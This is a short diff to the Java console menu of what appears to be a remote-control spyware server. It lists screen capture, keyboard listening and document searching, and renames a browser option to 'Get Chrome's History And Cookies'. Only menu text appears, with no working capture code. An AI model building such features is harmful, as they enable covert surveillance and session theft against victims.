@@ -81,7 +81,7 @@ public class Server extends Observable
         menu.append("\t1. Print Screen\n");
         menu.append("\t2. Listen On Keyboard\n");
         menu.append("\t3. Search For Documents (txt,doc,pdf,xls)\n");
-        menu.append("\t4. Listen To Browser");
+        menu.append("\t4. Get Chrome's History And Cookies");
 
         System.out.println(menu);
     }
